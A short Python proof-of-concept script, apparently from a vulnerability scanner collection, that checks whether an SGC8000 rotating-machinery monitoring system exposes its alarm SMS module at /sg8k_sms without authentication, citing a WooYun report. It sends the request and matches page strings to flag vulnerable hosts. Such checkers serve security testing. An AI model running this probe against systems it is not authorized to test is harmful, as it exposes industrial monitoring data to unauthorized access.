#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: sgc8000 大型旋转机监控系统报警短信模块泄露
referer: http://www.wooyun.org/bugs/wooyun-2015-0135197
author: Lucifer
description: 访问/sg8k_sms,未授权获取监控系统报警信息。
'''
import sys
import requests


class sgc8000_sg8k_sms_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/sg8k_sms"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"SG8000" in req.text and r"getMachineList" in req.text and r"cancelSendMessage" in req.text:
                return "[+]存在sgc8000 大型旋转机监控系统报警短信模块泄露漏洞...(中危)\tpayload: "+vulnurl
            else:
                return "[-]no"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = sgc8000_sg8k_sms_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()